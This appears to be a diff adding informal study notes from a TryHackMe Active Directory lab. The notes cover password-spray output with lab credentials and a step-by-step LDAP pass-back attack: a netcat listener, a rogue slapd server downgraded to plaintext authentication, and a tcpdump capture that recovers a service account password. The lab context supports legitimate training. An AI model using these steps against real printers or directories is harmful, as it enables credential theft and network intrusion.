@@ -1,0 +1,80 @@
+it better to use web based machine because dns settings on your real workstation is to bad
+
+
+DO THAT BEFORE ALL OPERATIONS
+systemd-resolve --interface breachad --set-dns $THMDCIP --set-domain za.tryhackme.com
+
+
+[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
+[-] Failed login with Username: alan.jones
+[-] Failed login with Username: frank.fletcher
+[-] Failed login with Username: maria.sheppard
+[-] Failed login with Username: sophie.blackburn
+[-] Failed login with Username: dawn.hughes
+[-] Failed login with Username: henry.black
+[-] Failed login with Username: joanne.davies
+[-] Failed login with Username: mark.oconnor
+[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
+[*] Password spray attack completed, 4 valid credential pairs found
+
+
+LDAP Pass-back Attacks
+
+However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.
+
+LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.
+
+http://printer.za.tryhackme.com/settings.aspx 
+here we can find the login: svcLDAP
+
+
+nc -lvp 389
+
+Note that if you use the AttackBox, the you should first disable slapd using service slapd stop. Then, we can alter the Server input box on the web application to point to our IP and press Test Settings.
+
+Your IP will be your VPN IP and will either be a 10.50.x.x IP or 10.51.x.x IP.  You can use ip a to list all interfaces. Please make sure to use this as your IP, otherwise you will not receive a connection back. Please also make note of the interface for this IP, since you will need it later in the task. 
+
+
+i got:
+
+ objectclass0\ufffdsupportedCapabilities
+
+lets create our rogue ldap server:
+
+thm attackbox: service slapd stop
+
+
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+
+sudo dpkg-reconfigure -p low slapd
+
+rename all to:
+za.tryhackme.com
+
+Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:
+         
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+
+###     CONTENT END
+
+
+Now we can use the ldif file to patch our LDAP server using the following:
+
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+
+to check it:
+
+ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+
+anser:
+supportedSASLMechanisms: PLAIN
+supportedSASLMechanisms: LOGIN
+
+TCPDUMP:
+sudo tcpdump -SX -i breachad tcp port 389
+
+password: tryhackmeldappass1@
+
